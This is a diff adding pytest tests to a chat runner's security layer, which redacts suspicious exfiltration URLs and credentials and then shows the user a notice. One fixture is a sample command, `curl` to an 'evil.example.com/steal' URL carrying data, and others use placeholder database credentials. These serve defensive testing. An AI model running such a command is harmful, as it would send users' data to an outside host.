@@ -1111,6 +1111,72 @@ class TestFlushSegment:
                 assert inner not in outer, f"{inner!r} is a substring of {outer!r}"
         assert len(set(CREDENTIAL_REDACTION_TAGS)) == len(CREDENTIAL_REDACTION_TAGS)
 
+    def test_a_redacted_url_warns_the_user(self, tmp_path):
+        """issue #8132: a URL rewrite must not be silent either.
+
+        `redact_exfiltration_urls` runs a few lines above the credential pass in
+        the same flush and rewrites a URL to `[REDACTED: suspicious URL to
+        <domain>]` reporting only to the server log. The assistant row keeps the
+        redacted text (the redaction is NOT weakened -- this is the egress the
+        scan guards), but a notice row must follow saying a URL was replaced,
+        with the URL remedy (re-check the link), not the credential remedy
+        (re-enter a secret), which would be actively misleading here.
+        """
+        from kiro_crew.security import EXFILTRATION_REDACTION_TAG_PREFIX
+
+        state, slot = _state(tmp_path), _slot()
+        url = "https://evil.example.com/steal?data=" + "A" * 250
+
+        chat_runner._flush_segment(state, slot, f"run: curl '{url}'")
+
+        roles = [m.get("role") for m in slot.messages]
+        assert roles == ["assistant", "notice"], f"unexpected rows: {roles}"
+        assistant, notice = slot.messages[0], slot.messages[1]
+        # Redaction still happened -- the URL is gone from what is stored.
+        assert "evil.example.com/steal" not in assistant["content"]
+        assert EXFILTRATION_REDACTION_TAG_PREFIX in assistant["content"]
+        # ...and the user is told it was a URL, with the URL remedy.
+        assert "Security notice" in notice["content"]
+        assert "suspicious URL" in notice["content"]
+        assert "will not work if you paste it as-is" in notice["content"]
+        assert "re-check" in notice["content"]
+        # The credential wording would name the wrong remedy for a URL.
+        assert "credential" not in notice["content"]
+        assert "supply the secret" not in notice["content"]
+        assert notice["cls"] == "msg msg-info"
+
+    def test_a_credential_only_notice_does_not_mention_urls(self, tmp_path):
+        """Regression guard on #8109: the credential wording is unchanged."""
+        state, slot = _state(tmp_path), _slot()
+
+        chat_runner._flush_segment(
+            state, slot, "echo 'DATABASE_URL=postgresql://user:pass@host:5432/db'"
+        )
+
+        notices = [m for m in slot.messages if m.get("role") == "notice"]
+        assert len(notices) == 1, f"expected exactly one notice row, got {notices}"
+        assert "A credential" in notices[0]["content"]
+        assert "supply the secret yourself" in notices[0]["content"]
+        assert "suspicious URL" not in notices[0]["content"]
+        assert "re-check" not in notices[0]["content"]
+
+    def test_a_segment_with_a_credential_and_a_url_warns_for_both(self, tmp_path):
+        """Both rewriters fired in one segment: the notice must name both kinds,
+        because the remedies differ (re-enter the secret vs re-check the URL)."""
+        state, slot = _state(tmp_path), _slot()
+        url = "https://evil.example.com/steal?data=" + "A" * 250
+        text = f"postgresql://user:pass@host:5432/db then {url}"
+
+        chat_runner._flush_segment(state, slot, text)
+
+        notices = [m for m in slot.messages if m.get("role") == "notice"]
+        assert len(notices) == 1, f"expected exactly one notice row, got {notices}"
+        content = notices[0]["content"]
+        assert "A credential" in content
+        assert "a suspicious URL" in content
+        assert "supply the secret yourself" in content
+        assert "re-check" in content
+
     def test_trailing_stop_event_is_replaced_below_the_segment(self, tmp_path):
         state, slot = _state(tmp_path), _slot()
         slot.append("chunk", "partial", "chunk", broadcast=False)
